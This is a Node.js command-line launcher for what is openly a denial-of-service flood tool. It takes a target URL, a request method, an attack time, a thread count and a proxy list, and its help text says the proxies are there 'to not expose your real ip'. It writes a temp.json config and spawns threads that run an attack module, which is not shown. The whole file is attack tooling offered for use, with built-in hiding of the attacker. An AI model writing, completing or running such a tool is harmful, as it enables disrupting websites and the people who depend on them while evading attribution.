const fs = require('fs');
const { Command } = require('commander');
const log = require('./modules/logger');
const thread = require('./modules/threads');
const program = new Command();

log.banner();

program.version('2.0.0');
program.option('-u, --url <link>', 'target url');
program.option('-m, --method <GET, POST>', 'attack method');
program.option('-t, --time <length>', 'attack time');
program.option('-r, --reqs <length>', 'req per proxy connection');
program.option('-th, --threads <length>', 'threads per attack');
program.option('-tm, --timeout <length>', 'socket timeout');
program.option('-pl, --proxylist <filename>', 'to not expose your real ip');
program.option('-p, --parameters', 'list all parameters');

program.parse(process.argv);

if (program.parameters) {
    return log.args();
}

if (!program.url || !program.method || !program.time || !program.proxylist) {
    return log.error('you lacked to define something, put -p or --parameters');
}

if (!program.timeout) {
    program.timeout = 15;
}

if (!program.reqs) {
    program.reqs = 50;
}

if (!program.threads) {
    program.threads = 1;
}

var temp = `temp.json`;

if (fs.existsSync(temp)) {
    fs.unlinkSync(temp);
}

fs.writeFile(temp, `{ "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs}, "timeout": ${program.timeout}, "proxylist": "${program.proxylist}" }`, function (err) {
    if (err) {
        return log.error('error on create temp.json.');
    }

    for (var i = 0; i < program.threads; i++) {
        thread.CreateThread(`./modules/attack.js`);
    }

    log.success("Attack started!");
})